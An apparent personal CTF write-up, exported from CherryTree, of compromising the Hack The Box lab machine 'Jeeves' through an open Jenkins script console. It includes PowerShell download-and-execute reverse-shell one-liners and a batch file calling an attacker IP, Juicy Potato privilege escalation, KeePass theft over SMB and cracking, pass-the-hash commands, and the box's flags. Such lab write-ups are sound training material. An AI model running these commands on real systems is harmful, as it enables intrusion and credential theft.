<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>jeeves</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="#jeeves">jeeves</a></p>
<ol>
<li><a href="#nmapAutomator.sh">nmapAutomator.sh</a></li>
<ol>
<li><a href="#nmap">nmap</a></li>
<ol>
<li><a href="#nmap vulns">nmap vulns</a></li>
</ol>
<li><a href="#recon">recon</a></li>
<ol>
<li><a href="#gobuster">gobuster</a></li>
<li><a href="#nikto">nikto</a></li>
</ol>
</ol>
<li><a href="#webserver 80">webserver 80</a></li>
<li><a href="#webserver 50000">webserver 50000</a></li>
<ol>
<li><a href="#searchsploit ">searchsploit </a></li>
<ol>
<li><a href="#directory traversal">directory traversal</a></li>
</ol>
</ol>
<li><a href="#Initial foothold">Initial foothold</a></li>
<ol>
<li><a href="#/askjeeves">/askjeeves</a></li>
<ol>
<li><a href="#manage jenkins">manage jenkins</a></li>
<ol>
<li><a href="#script console (cmd execution)">script console (cmd execution)</a></li>
<li><a href="#Invoke_PowershellTcp">Invoke_PowershellTcp</a></li>
</ol>
</ol>
</ol>
<li><a href="#priv esc to root">priv esc to root</a></li>
<ol>
<li><a href="#windows-exploit-suggester">windows-exploit-suggester</a></li>
<li><a href="#juicy potato">juicy potato</a></li>
<ol>
<li><a href="#download jp to victim">download jp to victim</a></li>
<ol>
<li><a href="#shell.bat">shell.bat</a></li>
</ol>
<li><a href="#jp.exe -t * -p shell.bat -l 9001">jp.exe -t * -p shell.bat -l 9001</a></li>
<li><a href="#rev shell">rev shell</a></li>
</ol>
<li><a href="#intended way">intended way</a></li>
<ol>
<li><a href="#smbshare">smbshare</a></li>
<li><a href="#keepass2john">keepass2john</a></li>
<li><a href="#kpcli">kpcli</a></li>
<ol>
<li><a href="#entries">entries</a></li>
</ol>
<li><a href="#pth-winexe/psexec privesc">pth-winexe/psexec privesc</a></li>
<li><a href="#using powershell commands in limited shell">using powershell commands in limited shell</a></li>
</ol>
</ol>
<li><a href="#hm.txt">hm.txt</a></li>
<li><a href="#user/root flags">user/root flags</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page" id="jeeves"><h1><b><u>jeeves</u></b></h1><img alt="images/1261-1.png" src="images/1261-1.png"/><br/><img alt="images/1261-2.png" src="images/1261-2.png"/></div>
<div class="page" id="nmapAutomator.sh"><h1><b><u>nmapAutomator.sh</u></b></h1><span style="color:#24ff00;">Lets run Tib3rius' Nmap Auto scan to start with</span><br/><span style="color:#ffa500;">nmapAutomator.sh 10.10.10.63 All<br/>• nmap<br/>• recon</span></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><img alt="images/1263-1.png" src="images/1263-1.png"/><span style="color:#24ff00;"><br/><br/>webserver is running on port 80<br/>SMB is running on ports 135 and 445<br/>another webserver seems to be running on port 50000<br/></span><img alt="images/1263-2.png" src="images/1263-2.png"/><br/><img alt="images/1263-3.png" src="images/1263-3.png"/><br/><br/><br/><br/><br/><br/><br/><br/></div>
<div class="page" id="nmap vulns"><h1><b><u>nmap vulns</u></b></h1><img alt="images/1265-1.png" src="images/1265-1.png"/><br/><br/><img alt="images/1265-2.png" src="images/1265-2.png"/><br/><br/></div>
<div class="page" id="recon"><h1><b><u>recon</u></b></h1><h1>gobuster 80,50000<br/>nikto</h1></div>
<div class="page" id="gobuster"><h1><b><u>gobuster</u></b></h1>port 80 gobuster <br/><br/><img alt="images/1270-1.png" src="images/1270-1.png"/><br/><br/>port 50000<br/><img alt="images/1270-2.png" src="images/1270-2.png"/><br/><br/></div>
<div class="page" id="nikto"><h1><b><u>nikto</u></b></h1><img alt="images/1271-1.png" src="images/1271-1.png"/></div>
<div class="page" id="webserver 80"><h1><b><u>webserver 80</u></b></h1><img alt="images/1266-1.png" src="images/1266-1.png"/><br/><br/><span style="color:#ffa500;">error.html</span><span style="color:#24ff00;"> is just a picture and is most likely there to mislead us if we attempt to enumerate it</span><br/><img alt="images/1266-2.png" src="images/1266-2.png"/><br/><img alt="images/1266-3.png" src="images/1266-3.png"/><br/><br/><span style="color:#24ff00;">the page source shows this "error message" is just a picture</span><br/><img alt="images/1266-4.png" src="images/1266-4.png"/><br/><img alt="images/1266-5.png" src="images/1266-5.png"/></div>
<div class="page" id="webserver 50000"><h1><b><u>webserver 50000</u></b></h1><img alt="images/1267-1.png" src="images/1267-1.png"/><br/><br/><br/><img alt="images/1267-2.png" src="images/1267-2.png"/>we have a version </div>
<div class="page" id="searchsploit "><h1><b><u>searchsploit </u></b></h1>Note: <strong><span style="text-decoration:underline;">DEAD END</span></strong><strong><br/><br/></strong>jetty was version 9.4, no luck here besides the directory traversal<strong><br/></strong><img alt="images/1268-1.png" src="images/1268-1.png"/><br/><br/></div>
<div class="page" id="directory traversal"><h1><b><u>directory traversal</u></b></h1><img alt="images/1269-1.png" src="images/1269-1.png"/><br/><br/><img alt="images/1269-2.png" src="images/1269-2.png"/><br/><br/><span style="color:#24ff00;">lets try navigating to </span><br/><span style="color:#ffa500;">10.10.10.63:9084/vci/downloads/.\..\..\..\..\..\..\..\Documents and Settings\All Users\Application Data\VMware\VMware VirtualCenter\SSL\rui.key</span><br/><br/><img alt="images/1269-3.png" src="images/1269-3.png"/><br/><span style="color:#24ff00;">no luck, </span><span style="color:#ffa500;">jetty</span><span style="color:#24ff00;"> does </span><span style="color:#ff0000;">not</span><span style="color:#24ff00;"> seem to have any known </span><span style="color:#ffff00;">exploits</span></div>
<div class="page" id="Initial foothold"><h1><b><u>Initial foothold</u></b></h1><span style="color:#24ff00;">since we've run into nothing but rabbit holes at this point lets try a different wordlist for gobuster <br/><br/></span><span style="color:#ffa500;">gobuster dir -u http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </span><br/><img alt="images/1275-1.png" src="images/1275-1.png"/><br/><br/><span style="color:#24ff00;">we see we have a hit for </span><span style="color:#ffa500;">/askjeeves</span><br/><img alt="images/1275-2.png" src="images/1275-2.png"/><br/></div>
<div class="page" id="/askjeeves"><h1><b><u>/askjeeves</u></b></h1><span style="color:#24ff00;">apparently the Jenkins administrative panel is not password protected? Huge security misconfiguration here.</span><br/><img alt="images/1274-1.png" src="images/1274-1.png"/></div>
<div class="page" id="manage jenkins"><h1><b><u>manage jenkins</u></b></h1><span style="color:#ffa500;">script console</span><span style="color:#24ff00;"> catches the eye</span><br/><img alt="images/1276-1.png" src="images/1276-1.png"/><br/><span style="color:#24ff00;">executes arbitary script for administration/trouble-shooting/diagnostics</span></div>
<div class="page" id="script console (cmd execution)"><h1><b><u>script console (cmd execution)</u></b></h1><img alt="images/1277-1.png" src="images/1277-1.png"/><br/><br/>we see we have command execution!<br/><br/></div>
<div class="page" id="Invoke_PowershellTcp"><h1><b><u>Invoke_PowershellTcp</u></b></h1>gonna use nishang here to call back a reverse powershell back to our attack machine<br/><br/>1. first thing is to copy the nishang script to our pwd <br/>2. add the Invoke-PowershellTcp -Reverse - Ipaddress 10.10.14.62 -p 4444 to the script<br/>3. next is to upload it to our victim using IEX downloadstring command<br/><br/><img alt="images/1278-1.png" src="images/1278-1.png"/><br/><br/><br/><br/><img alt="images/1278-2.png" src="images/1278-2.png"/><br/><br/><br/>cmd = "powershell IEX (new-object net.webclient).downloadstring('http://10.10.14.62:5555/revshell.ps1')"<br/><br/><img alt="images/1278-3.png" src="images/1278-3.png"/><br/><br/><img alt="images/1278-4.png" src="images/1278-4.png"/><br/><br/>and we see we get our shell called back to us!<br/><img alt="images/1278-5.png" src="images/1278-5.png"/></div>
<div class="page" id="priv esc to root"><h1><b><u>priv esc to root</u></b></h1><span style="color:#24ff00;">lets enuemrate jeeves security misconfigurations with windows exploit suggester first since that's a favorite of mine</span><br/><span style="color:#ffa500;">•</span> <span style="color:#ffa500;">windows-exploit-suggestor<br/>• juicy potato<br/>• intended way<br/><br/></span><br/></div>
<div class="page" id="windows-exploit-suggester"><h1><b><u>windows-exploit-suggester</u></b></h1><span style="color:#24ff00;">first we grab the </span><span style="color:#ffa500;">systeminfo</span><span style="color:#24ff00;"> panel of the box and save it to a file</span><br/><br/><img alt="images/1281-1.png" src="images/1281-1.png"/><br/><span style="color:#ffa500;">python windows-exploit-suggester.py -d 2020-07-02-mssb.xls -i /root/Documents/htb/boxes/jeeves/system</span><br/><img alt="images/1281-2.png" src="images/1281-2.png"/><br/><img alt="images/1281-3.png" src="images/1281-3.png"/><br/><img alt="images/1281-4.png" src="images/1281-4.png"/><br/><img alt="images/1281-5.png" src="images/1281-5.png"/><br/><img alt="images/1281-6.png" src="images/1281-6.png"/><br/><br/><br/></div>
<div class="page" id="juicy potato"><h1><b><u>juicy potato</u></b></h1><span style="color:#24ff00;">first thing we need to do is download</span><span style="color:#ffa500;"> juicy potato</span><span style="color:#24ff00;"> to our machine<br/><br/></span><img alt="images/1283-1.png" src="images/1283-1.png"/><br/><br/>I open with <span style="color:#ffa500;">archive manager </span><span style="color:#24ff00;">because the save file option gives us an empty file<br/></span><img alt="images/1283-2.png" src="images/1283-2.png"/><br/></div>
<div class="page" id="download jp to victim"><h1><b><u>download jp to victim</u></b></h1><span style="color:#24ff00;">first set up the webserver<br/><br/>copy another </span><span style="color:#ffa500;">invoke-powershelltcp.ps1 </span><span style="color:#24ff00;">and have it run a reverse shell back to us on a port of our choosing</span><br/><br/><img alt="images/1286-1.png" src="images/1286-1.png"/><br/><span style="color:#ffa500;">Invoke-powershelltcp -reverse -IPAddress 10.10.14.62 -port 6666</span><br/><img alt="images/1286-2.png" src="images/1286-2.png"/><br/><br/><img alt="images/1286-3.png" src="images/1286-3.png"/><br/><br/><span style="color:#24ff00;">download the exploits to our victim with the following powershell commands:</span><br/><span style="color:#ffa500;">IEX(new-object net.webclient).downloadfile('http://10.10.14.62:5555/jp.exe', ‘C:\Users\kohsuke\Desktop\jp.exe’)<br/><br/>IEX(new-object net.webclient).downloadfile('http://10.10.14.62:5555/shell.bat', 'C:\Users\kohsuke\Desktop\shell.bat')</span><br/><img alt="images/1286-4.png" src="images/1286-4.png"/><br/><br/></div>
<div class="page" id="shell.bat"><h1><b><u>shell.bat</u></b></h1><span style="color:#24ff00;">simple batch file to run</span><span style="color:#ffa500;"> invoke-powershelltcp.ps1</span><br/><br/><span style="color:#ffa500;">@ECHO OFF<br/>PowerShell.exe -Command "IEX(new-object net.webclient).downloadstring('http://10.10.14.62:5555/revshell2.ps1')"<br/>PAUSE</span><br/><img alt="images/1288-1.png" src="images/1288-1.png"/></div>
<div class="page" id="jp.exe -t * -p shell.bat -l 9001"><h1><b><u>jp.exe -t * -p shell.bat -l 9001</u></b></h1><span style="color:#ffa500;">./jp.exe -t * -p shell.bat -l 9001</span><br/><span style="color:#ffa500;">-t</span><span style="color:#24ff00;">: create process call. for this option we’ll use </span><span style="color:#ffa500;">*</span><span style="color:#24ff00;"> to test both options.<br/></span><span style="color:#ffa500;">-p</span><span style="color:#24ff00;">: the program to run. we’ll need to create a batch script that sends a reverse shell back to our attack machine.<br/></span><span style="color:#ffa500;">-l</span><span style="color:#24ff00;">: com server listen port. </span><br/><br/><img alt="images/1287-1.png" src="images/1287-1.png"/><br/><span style="color:#ffa500;">(because its over 9000)</span><br/><br/></div>
<div class="page" id="rev shell"><h1><b><u>rev shell</u></b></h1><span style="color:#24ff00;">and we're </span><span style="color:#ffff00;">nt authority/system</span><span style="color:#24ff00;">!</span><br/><img alt="images/1285-1.png" src="images/1285-1.png"/></div>
<div class="page" id="intended way"><h1><b><u>intended way</u></b></h1><span style="color:#24ff00;">There is a </span><span style="color:#ffff00;">keepass database file </span><span style="color:#24ff00;">located in</span><span style="color:#ffff00;"> Kohsuke's </span><span style="color:#24ff00;">Documents folder that may contain sensitive data we can use to escalate our privileges to </span><span style="color:#ffff00;">root</span><br/><img alt="images/1284-1.png" src="images/1284-1.png"/><br/>first we need to exfiltrate this program to our attacking machine and since <span style="color:#ffa500;">certutil</span><span style="color:#24ff00;"> isn't on this box we'll need to set up an </span><span style="color:#ffa500;">smbshare</span><span style="color:#24ff00;"> and transfer it back to our attack machine</span></div>
<div class="page" id="smbshare"><h1><b><u>smbshare</u></b></h1><span style="color:#24ff00;">first we'll set up our own smb share we'll use </span><span style="color:#ffa500;">impacket's</span><span style="color:#24ff00;"> built in</span><span style="color:#ffa500;"> smb server</span><span style="color:#24ff00;"><br/>and then copy </span><strong><span style="color:#ffa500;">CEH.kdbx</span></strong><span style="color:#24ff00;"> to it<br/><br/></span><span style="color:#ffa500;">impacket-smbserver temp .</span><br/><span style="color:#24ff00;">where <br/></span><span style="color:#ffa500;">temp</span><span style="color:#24ff00;"> is the name of our smb server <br/>and </span><span style="color:#ffa500;">. </span><span style="color:#24ff00;">puts it in smbshare in the current directory<br/></span><img alt="images/1291-1.png" src="images/1291-1.png"/><br/><br/><span style="color:#ffa500;">New-PSDrive -Name temp -PSProvider "FileSystem"  -Root "\\10.10.14.62\temp"</span><br/><img alt="images/1291-2.png" src="images/1291-2.png"/><br/><br/>navigate to the share<br/><span style="color:#ffa500;">cd temp:</span><br/><img alt="images/1291-3.png" src="images/1291-3.png"/><br/><br/>copy <span style="color:#ffa500;">CEH.kdbx</span><span style="color:#24ff00;"> to the </span><span style="color:#ffa500;">smbshare</span><br/><img alt="images/1291-4.png" src="images/1291-4.png"/><br/><br/>and now we have it on our attack machine <br/><img alt="images/1291-5.png" src="images/1291-5.png"/><br/></div>
<div class="page" id="keepass2john"><h1><b><u>keepass2john</u></b></h1><span style="color:#24ff00;">because the </span><span style="color:#ffff00;">keepass database</span><span style="color:#24ff00;"> is password protected we'll need to brute force it with John<br/><br/></span><span style="color:#ffa500;">keepass2john CEH.kdbx</span><br/><img alt="images/1292-1.png" src="images/1292-1.png"/><br/>save this <span style="color:#ffff00;">hash</span> <span style="color:#24ff00;">to a txt file for john to crack<br/><br/>we see here that john has the potential to brute force KeePass hashes, exactly what we're looking for<br/></span><img alt="images/1292-2.png" src="images/1292-2.png"/><br/><br/>lets run john with the following:<br/><span style="color:#ffa500;">john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br/><img alt="images/1292-3.png" src="images/1292-3.png"/><br/><br/>our password is cracked <img alt="images/1292-4.png" src="images/1292-4.png"/><br/><br/></div>
<div class="page" id="kpcli"><h1><b><u>kpcli</u></b></h1><span style="color:#24ff00;">Now we have all the information we need to open the KeePass database. To do that from the command line, we’ll use the </span><span style="color:#ffa500;">kpcli</span><span style="color:#24ff00;"> program.<br/><br/></span><span style="color:#ffa500;">kpcli --kdb CEH.kdbx</span><span style="color:#24ff00;"><br/>and enter the </span><span style="color:#ffff00;">moonshine1</span><span style="color:#24ff00;"> pw<br/></span><img alt="images/1293-1.png" src="images/1293-1.png"/><br/><br/><br/></div>
<div class="page" id="entries"><h1><b><u>entries</u></b></h1><span style="color:#24ff00;">to show each file in our entry list,<br/><br/></span><strong><span style="color:#ffa500;">show -f &lt;#&gt;</span></strong><br/><span style="color:#24ff00;">where </span><span style="color:#ffa500;">-f</span><span style="color:#24ff00;"> will unveil originally censored data<br/></span><img alt="images/1296-1.png" src="images/1296-1.png"/><br/><br/><br/>I’m not going to bother with admin and bob because I know from the <span style="color:#ffa500;">net user</span><span style="color:#24ff00;"> command that they’re not users on the system. The Backup stuff entry however contains what looks like an </span><span style="color:#ffff00;">NTLM hash</span><span style="color:#24ff00;">.<br/></span><img alt="images/1296-2.png" src="images/1296-2.png"/><br/><span style="color:#ffff00;">aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</span><br/></div>
<div class="page" id="pth-winexe/psexec privesc"><h1><b><u>pth-winexe/psexec privesc</u></b></h1><span style="color:#24ff00;">Let’s try a pass the hash attack on the administrator account.<br/></span><span style="color:#ffff00;">aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</span><span style="color:#24ff00;"><br/><br/>be sure to separate the user and the hash with a </span><span style="color:#ffa500;">%</span><span style="color:#24ff00;">!<br/></span><span style="color:#ffa500;">pth-winexe --user=administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe</span><br/><img alt="images/1294-1.png" src="images/1294-1.png"/><br/><br/>and we're <span style="color:#ffff00;">admin</span><span style="color:#24ff00;">!</span><br/><br/><span style="color:#24ff00;">we can use our ntlm hash in psexec as well<br/></span><span style="color:#ffa500;">psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63</span><br/><img alt="images/1294-2.png" src="images/1294-2.png"/><br/><img alt="images/1294-3.png" src="images/1294-3.png"/><br/><br/></div>
<div class="page" id="using powershell commands in limited shell"><h1><b><u>using powershell commands in limited shell</u></b></h1><span style="color:#24ff00;">since we don't have a powershell running through our </span><span style="color:#ffa500;">psexec</span><span style="color:#24ff00;">/</span><span style="color:#ffa500;">pth-winexe</span><span style="color:#24ff00;"> connections, we can use the command</span><br/><br/><span style="color:#ffa500;">powershell (Get-Content -path hm.txt -stream root.txt)</span><br/><img alt="images/1298-1.png" src="images/1298-1.png"/></div>
<div class="page" id="hm.txt"><h1><b><u>hm.txt</u></b></h1><span style="color:#24ff00;">we're not done yet after we get </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;">:<br/></span><img alt="images/1289-1.png" src="images/1289-1.png"/><br/><img alt="images/1289-2.png" src="images/1289-2.png"/><br/>"Look deeper" is hinting that <span style="color:#ffa500;">hm.txt</span><span style="color:#24ff00;"> has more content inside it, there's a module we can use to check<br/><br/>follow the stream with the command <br/></span><span style="color:#ffa500;">Get-Item -path hm.txt -stream *</span><br/><img alt="images/1289-3.png" src="images/1289-3.png"/><br/><br/><span style="color:#ffa500;">Get-Content -path hm.txt -stream root.txt</span><br/><img alt="images/1289-4.png" src="images/1289-4.png"/></div>
<div class="page" id="user/root flags"><h1><b><u>user/root flags</u></b></h1><img alt="images/1279-1.png" src="images/1279-1.png"/><span style="color:#ffff00;"><br/>e3232272596fb47950d59c4cf1e7066a<br/><br/></span><img alt="images/1279-2.png" src="images/1279-2.png"/><br/>afbc5bd4b615a60648cec41c6ac92530</div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><img alt="images/1295-1.png" src="images/1295-1.png"/></div>
